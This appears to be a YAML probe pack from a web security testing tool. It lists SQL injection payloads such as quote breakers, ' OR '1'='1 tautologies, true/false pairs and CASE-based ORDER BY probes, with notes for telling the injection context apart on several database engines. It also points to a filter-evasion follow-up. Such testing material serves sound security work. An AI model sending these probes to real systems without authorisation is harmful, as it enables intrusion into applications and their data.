# Injection-point probes. Every entry is non-destructive and reads nothing: the
# whole pack exists to tell four outcomes apart, not to extract anything.
#
# The pairing matters more than any single payload. A lone quote proves only
# that the application dislikes quotes; a quote that errors alongside a balanced
# equivalent that does not is what proves concatenation into a statement.
id: sqli/probe
reviewed: "2026-08-23"   # not re-verified since; treat as unreviewed, not current
title: Injection point discovery probes
credits:
  - "Technique coverage informed by PortSwigger Web Security Academy's SQL injection labs and by PayloadsAllTheThings; entries are written for this project."
entries:
  - name: single quote
    payload: "'"
    detect: "Engine or driver error, or any response differing from both the baseline and a plain rejected value."

  - name: double quote
    payload: "\""
    detect: "Distinguishes double-quoted string contexts, and engines that accept double quotes as string delimiters."

  - name: trailing backslash
    payload: "\\"
    detect: "Escapes the closing delimiter on engines that honour backslash escapes, breaking the statement where a quote alone was filtered."

  - name: balanced string equivalent
    payload: "' AND '1'='1"
    detect: "Must return the baseline record. A baseline-identical response here alongside an error for the lone quote is the concatenation proof."
    note: "Reconstructs the closing quote and adds a tautology, which parses on all five engines. Adjacent string literals -- ' 'a' = 'a -- look equivalent and are not: only MySQL concatenates literals by juxtaposition, so on PostgreSQL and SQLite that form is a syntax error indistinguishable from the lone quote."

  - name: balanced string true
    payload: "' OR '1'='1"
    detect: "Broadens the result set in a string context. Compare record count against baseline."

  - name: balanced string false
    payload: "' AND '1'='2"
    detect: "Must empty the result set in a string context. The differential against the true form is the strongest cheap signal."

  - name: numeric identity
    payload: " AND 1=1"
    detect: "Must return the baseline record in a numeric context without any quote at all."

  - name: numeric contradiction
    payload: " AND 1=2"
    detect: "Must empty the result set in a numeric context; pair with the identity above."

  - name: numeric arithmetic identity
    engine: [mysql, postgresql, mssql, sqlite]
    payload: "-0"
    detect: "Appended to a numeric id, an arithmetic no-op returns the same record only if the value is used as a number rather than as a string."

  - name: numeric arithmetic identity (Oracle)
    engine: [oracle]
    payload: "-0"
    detect: "Same intent as above; listed separately because Oracle's implicit numeric conversion differs and may error where other engines coerce."
    note: "If this errors while the plain id succeeds, the value is being bound rather than concatenated."

  # The identifier position -- a sort column or a sort direction -- takes none of
  # the forms above: no quote is involved and no arithmetic is appended, because
  # the value *is* the identifier rather than sitting inside a comparison. These
  # five replace the parameter's value outright, and the observable is the row
  # order rather than the row count.
  - name: identifier ordinal, first column
    payload: "1"
    detect: "Replaces a sort column outright. Ordering by the first column; pair with the second ordinal below and read the row order, not the row count."
    note: "Ordinal ordering is standard SQL and accepted by all five engines, which makes this the cheapest identifier probe that needs no column name."

  - name: identifier ordinal, second column
    payload: "2"
    detect: "A row order differing from the first ordinal is the identifier-context signal: the value reached an ORDER BY clause rather than a comparison."

  - name: identifier direction reversal
    payload: "name DESC"
    detect: "Where the parameter names a direction rather than a column, the reversed order is the signal. Substitute the column the endpoint actually sorts by."

  - name: identifier conditional ordering, true
    payload: "(CASE WHEN 1=1 THEN id ELSE 0 END)"
    detect: "Orders by the real column. Pair with the false form: two different row orders prove the engine evaluated a condition, which no template echo can do."
    note: "The identifier position's equivalent of the arithmetic pair. Both CASE branches must share a type -- a text branch beside an integer one is rejected by PostgreSQL and Oracle before the condition is ever evaluated."

  - name: identifier conditional ordering, false
    payload: "(CASE WHEN 1=2 THEN id ELSE 0 END)"
    detect: "Orders by a constant, so the rows keep their natural order. The difference from the true form is the whole signal."

  - name: identifier non-existent column
    payload: "hrr_no_such_column"
    detect: "An error naming the column proves the value is interpolated into an identifier position. A generic page instead means the parameter is validated against a list before any statement is built."

  - name: inert hostile control
    payload: "<<sqli-control-not-sql>>"
    detect: "Looks hostile but contains no SQL syntax. If this is blocked identically to the quote, the block is a filter and not a query error -- go to PTN-INJ-01-EVADE."
